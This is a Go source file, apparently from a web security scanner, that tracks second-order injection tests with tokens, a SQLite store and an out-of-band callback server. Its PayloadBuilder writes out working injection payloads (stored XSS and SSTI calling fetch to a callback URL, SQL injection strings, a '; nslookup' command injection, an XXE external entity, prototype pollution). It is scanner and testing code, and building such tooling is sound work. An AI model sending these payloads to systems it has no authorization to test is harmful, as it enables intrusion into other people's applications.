package secondorder

import (
	"crypto/rand"
	"database/sql"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	_ "modernc.org/sqlite"

	"github.com/ares/engine/internal/logger"
	"github.com/ares/engine/internal/uuid"
)

type Injection struct {
	ID        string
	Token     string
	TargetURL string
	Param     string
	Payload   string
	Type      string
	CreatedAt time.Time
	Triggered bool
	Severity  string
}

type CorrelationEngine struct {
	mu         sync.RWMutex
	injections map[string]*Injection
	db         *sql.DB
	listener   string
	oobBase    string
	stopCh     chan struct{}
}

func severityTTL(severity string) time.Duration {
	switch severity {
	case "critical":
		return 24 * time.Hour
	case "high":
		return 2 * time.Hour
	case "medium":
		return 30 * time.Minute
	default:
		return 5 * time.Minute
	}
}

func severityForType(vulnType string) string {
	switch vulnType {
	case "blind-sqli", "prototype-pollution":
		return "critical"
	case "stored-xxe", "stored-cmd-injection":
		return "high"
	case "stored-xss", "stored-ssti", "second-order-sqli":
		return "medium"
	case "stored-open-redirect":
		return "low"
	default:
		return "medium"
	}
}

const maxInjections = 10000

func NewCorrelationEngine(oobBase string) *CorrelationEngine {
	dbPath := filepath.Join(os.TempDir(), "ares-secondorder.db")
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		logger.Error(fmt.Sprintf("[SecondOrder] Failed to open file DB at %s: %v, falling back to in-memory", dbPath, err))
		db, err = sql.Open("sqlite", "file::memory:?cache=shared")
		if err != nil {
			logger.Error(fmt.Sprintf("[SecondOrder] CRITICAL: Failed to open in-memory DB: %v", err))
			db = nil
		}
	}

	if db != nil {
		if _, err := db.Exec("PRAGMA journal_mode=WAL"); err != nil {
			logger.Error(fmt.Sprintf("[SecondOrder] Failed to set WAL mode: %v", err))
		}
		if _, err := db.Exec("PRAGMA synchronous=NORMAL"); err != nil {
			logger.Error(fmt.Sprintf("[SecondOrder] Failed to set synchronous mode: %v", err))
		}
	}

	ce := &CorrelationEngine{
		injections: make(map[string]*Injection),
		oobBase:    oobBase,
		db:         db,
		stopCh:     make(chan struct{}),
	}

	if ce.db != nil {
		ce.initDB()
		ce.loadFromDB()
	}

	go ce.periodicCleanup()

	return ce
}

const createTableSQL = `CREATE TABLE IF NOT EXISTS injections (
	id TEXT PRIMARY KEY,
	token TEXT UNIQUE NOT NULL,
	target_url TEXT,
	param TEXT,
	payload TEXT,
	vuln_type TEXT,
	created_at TEXT,
	triggered INTEGER DEFAULT 0,
	severity TEXT DEFAULT 'medium'
)`

const createIndexSQL = `CREATE INDEX IF NOT EXISTS idx_injections_token ON injections(token)`

const selectAllSQL = `SELECT id, token, target_url, param, payload, vuln_type, created_at, triggered, severity FROM injections`

const insertSQL = `INSERT OR REPLACE INTO injections (id, token, target_url, param, payload, vuln_type, created_at, triggered, severity) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`

const deleteSQL = `DELETE FROM injections WHERE id = ? OR token = ?`

const updateTriggeredSQL = `UPDATE injections SET triggered = 1 WHERE token = ?`

func (ce *CorrelationEngine) initDB() {
	if ce.db == nil {
		return
	}
	ce.db.Exec(createTableSQL)
	ce.db.Exec(createIndexSQL)
}

func (ce *CorrelationEngine) loadFromDB() {
	if ce.db == nil {
		return
	}
	rows, err := ce.db.Query(selectAllSQL)
	if err != nil {
		return
	}
	defer rows.Close()

	for rows.Next() {
		var inj Injection
		var createdAtStr string
		if err := rows.Scan(&inj.ID, &inj.Token, &inj.TargetURL, &inj.Param, &inj.Payload, &inj.Type, &createdAtStr, &inj.Triggered, &inj.Severity); err != nil {
			continue
		}
		if t, err := time.Parse(time.RFC3339, createdAtStr); err == nil {
			inj.CreatedAt = t
		}
		if time.Since(inj.CreatedAt) < severityTTL(inj.Severity) {
			ce.mu.Lock()
			ce.injections[inj.ID] = &inj
			ce.injections[inj.Token] = &inj
			ce.mu.Unlock()
		}
	}
}

func (ce *CorrelationEngine) saveToDB(inj *Injection) {
	if ce.db == nil {
		return
	}
	_, err := ce.db.Exec(insertSQL,
		inj.ID, inj.Token, inj.TargetURL, inj.Param, inj.Payload, inj.Type, inj.CreatedAt.Format(time.RFC3339), boolToInt(inj.Triggered), inj.Severity)
	if err != nil {
		logger.Error(fmt.Sprintf("[SecondOrder] Failed to save injection to DB: %v", err))
	}
}

func (ce *CorrelationEngine) deleteFromDB(id, token string) {
	if ce.db == nil {
		return
	}
	_, err := ce.db.Exec(deleteSQL, id, token)
	if err != nil {
		logger.Error(fmt.Sprintf("[SecondOrder] Failed to delete injection from DB: %v", err))
	}
}

func (ce *CorrelationEngine) updateTriggeredInDB(token string) {
	if ce.db == nil {
		return
	}
	_, err := ce.db.Exec(updateTriggeredSQL, token)
	if err != nil {
		logger.Error(fmt.Sprintf("[SecondOrder] Failed to update triggered in DB: %v", err))
	}
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}

func (ce *CorrelationEngine) GenerateToken() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("crypto/rand failed during token generation: %w", err)
	}
	return hex.EncodeToString(b), nil
}

func (ce *CorrelationEngine) Register(targetURL, param, payload, vulnType string) string {
	ce.mu.Lock()

	if len(ce.injections) >= maxInjections*2 {
		logger.Warn("[SecondOrder] Injection map at capacity, running cleanup before registering new injection")
		ce.mu.Unlock()
		ce.Cleanup()
		ce.mu.Lock()
	}

	token, err := ce.GenerateToken()
	if err != nil {
		ce.mu.Unlock()
		logger.Error(fmt.Sprintf("[SecondOrder] Failed to generate correlation token: %v", err))
		return ""
	}
	sev := severityForType(vulnType)
	injection := &Injection{
		ID:        uuid.New(),
		Token:     token,
		TargetURL: targetURL,
		Param:     param,
		Payload:   payload,
		Type:      vulnType,
		CreatedAt: time.Now(),
		Triggered: false,
		Severity:  sev,
	}
	ce.injections[injection.ID] = injection
	ce.injections[token] = injection
	ce.mu.Unlock()
	ce.saveToDB(injection)
	return token
}

func (ce *CorrelationEngine) Inject(token string) string {
	ce.mu.RLock()
	defer ce.mu.RUnlock()

	if inj, ok := ce.injections[token]; ok {
		return injectToken(inj.Payload, token)
	}
	return ""
}

func injectToken(payload, token string) string {
	if strings.Contains(payload, "${TOKEN}") {
		return strings.ReplaceAll(payload, "${TOKEN}", token)
	}
	if strings.Contains(payload, "{{TOKEN}}") {
		return strings.ReplaceAll(payload, "{{TOKEN}}", token)
	}
	if strings.Contains(payload, "__TOKEN__") {
		return strings.ReplaceAll(payload, "__TOKEN__", token)
	}
	return fmt.Sprintf("%s <script id='x' data-token='%s'></script>", payload, token)
}

func (ce *CorrelationEngine) CheckTrigger(token string) bool {
	ce.mu.Lock()
	defer ce.mu.Unlock()

	if inj, ok := ce.injections[token]; ok {
		if inj.Triggered {
			return true
		}
		if time.Since(inj.CreatedAt) > severityTTL(inj.Severity) {
			ce.deleteFromDB(inj.ID, token)
			delete(ce.injections, inj.ID)
			delete(ce.injections, token)
			return false
		}
		return inj.Triggered
	}
	return false
}

func (ce *CorrelationEngine) Trigger(token string) {
	ce.mu.Lock()
	defer ce.mu.Unlock()

	if inj, ok := ce.injections[token]; ok {
		inj.Triggered = true
		ce.updateTriggeredInDB(token)
	}
}

func (ce *CorrelationEngine) ListPending() []*Injection {
	ce.mu.RLock()
	defer ce.mu.RUnlock()

	var pending []*Injection
	for _, inj := range ce.injections {
		if !inj.Triggered && time.Since(inj.CreatedAt) < severityTTL(inj.Severity) {
			pending = append(pending, inj)
		}
	}
	return pending
}

func (ce *CorrelationEngine) Cleanup() {
	ce.mu.Lock()
	defer ce.mu.Unlock()

	for token, inj := range ce.injections {
		if time.Since(inj.CreatedAt) > severityTTL(inj.Severity) {
			ce.deleteFromDB(inj.ID, token)
			delete(ce.injections, token)
			delete(ce.injections, inj.ID)
		}
	}
}

func (ce *CorrelationEngine) Correlate(targetURL, responseBody string) []string {
	ce.mu.RLock()
	defer ce.mu.RUnlock()

	var matched []string
	seen := make(map[string]bool)
	for _, inj := range ce.injections {
		if seen[inj.Token] {
			continue
		}
		if strings.Contains(responseBody, inj.Token) {
			matched = append(matched, inj.Token)
			seen[inj.Token] = true
		}
	}
	return matched
}

func (ce *CorrelationEngine) CheckTriggers(tokens []string) map[string]bool {
	ce.mu.Lock()
	defer ce.mu.Unlock()

	result := make(map[string]bool, len(tokens))
	for _, token := range tokens {
		if inj, ok := ce.injections[token]; ok {
			if inj.Triggered {
				result[token] = true
				continue
			}
			if time.Since(inj.CreatedAt) > severityTTL(inj.Severity) {
				ce.deleteFromDB(inj.ID, token)
				delete(ce.injections, inj.ID)
				delete(ce.injections, token)
				result[token] = false
				continue
			}
			result[token] = inj.Triggered
		} else {
			result[token] = false
		}
	}
	return result
}

func (ce *CorrelationEngine) Stats() map[string]int {
	ce.mu.RLock()
	defer ce.mu.RUnlock()

	stats := map[string]int{
		"total_registered": 0,
		"total_triggered":  0,
		"total_expired":    0,
	}
	byType := make(map[string]int)
	now := time.Now()

	for _, inj := range ce.injections {
		stats["total_registered"]++
		byType[inj.Type]++
		if inj.Triggered {
			stats["total_triggered"]++
		}
		if now.Sub(inj.CreatedAt) > severityTTL(inj.Severity) {
			stats["total_expired"]++
		}
	}

	for t, c := range byType {
		stats["by_type_"+t] = c
	}

	return stats
}

func (ce *CorrelationEngine) periodicCleanup() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for {
		select {
		case <-ce.stopCh:
			return
		case <-ticker.C:
			ce.Cleanup()
		}
	}
}

func (ce *CorrelationEngine) Stop() {
	close(ce.stopCh)
}

type OOBServer struct {
	ce          *CorrelationEngine
	httpServer  *http.Server
	oobTokenURL string
}

func NewOOBServer(ce *CorrelationEngine, addr string) *OOBServer {
	mux := http.NewServeMux()
	mux.HandleFunc("/callback", func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("token")
		if token != "" {
			ce.Trigger(token)
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	})

	return &OOBServer{
		ce:          ce,
		oobTokenURL: fmt.Sprintf("http://%s/callback?token=", addr),
		httpServer: &http.Server{
			Addr:              addr,
			Handler:           mux,
			ReadHeaderTimeout: 10 * time.Second,
			ReadTimeout:       30 * time.Second,
			WriteTimeout:      30 * time.Second,
			IdleTimeout:       120 * time.Second,
		},
	}
}

func (s *OOBServer) Start() error {
	return s.httpServer.ListenAndServe()
}

func (s *OOBServer) OOBURL(token string) string {
	return s.oobTokenURL + token
}

func (s *OOBServer) Register(targetURL, param, payload, vulnType string) string {
	return s.ce.Register(targetURL, param, payload, vulnType)
}

func (s *OOBServer) Check(token string) bool {
	return s.ce.CheckTrigger(token)
}

type PayloadBuilder struct {
	token       string
	vulnType    string
	basePayload string
	baseURL     string
}

func NewPayloadBuilder(vulnType, basePayload string) *PayloadBuilder {
	return &PayloadBuilder{
		vulnType:    vulnType,
		basePayload: basePayload,
	}
}

func (pb *PayloadBuilder) WithToken(token string) *PayloadBuilder {
	pb.token = token
	return pb
}

func (pb *PayloadBuilder) WithBaseURL(baseURL string) *PayloadBuilder {
	pb.baseURL = baseURL
	return pb
}

func (pb *PayloadBuilder) Build() string {
	switch pb.vulnType {
	case "stored-xss":
		return fmt.Sprintf(`<img src=x onerror='fetch("%s/callback?token=%s&type=xss")'>`,
			pb.baseURL, pb.token)
	case "stored-ssti":
		return fmt.Sprintf(`{{range.constructor("fetch('%s/callback?token=%s&type=ssti')")()}}`,
			pb.baseURL, pb.token)
	case "second-order-sqli":
		return fmt.Sprintf(`' AND (SELECT * FROM (SELECT COUNT(*) FROM information_schema.tables WHERE token='%s') x)--`,
			pb.token)
	case "stored-cmd-injection":
		return fmt.Sprintf(`; nslookup __TOKEN__.%s &`, pb.baseURL)
	case "blind-sqli":
		return fmt.Sprintf(`' OR (SELECT CASE WHEN (SELECT substr(token,1,1) FROM injections WHERE token='__TOKEN__')='a' THEN 1 ELSE 0 END)=1 --`)
	case "stored-open-redirect":
		return fmt.Sprintf(`//__TOKEN__.%s/redirect`, pb.baseURL)
	case "stored-xxe":
		return fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s/callback?token=__TOKEN__&type=xxe">]><foo>&xxe;</foo>`,
			pb.baseURL)
	case "prototype-pollution":
		return fmt.Sprintf(`{"__proto__":{"polluted":"__TOKEN__"}}`)
	default:
		return injectToken(pb.basePayload, pb.token)
	}
}

func IsSecondOrderVuln(vulnType string) bool {
	switch vulnType {
	case "stored-xss", "stored-ssti", "second-order-sqli", "stored-cmd-injection",
		"blind-sqli", "stored-open-redirect", "stored-xxe", "prototype-pollution":
		return true
	}
	return false
}
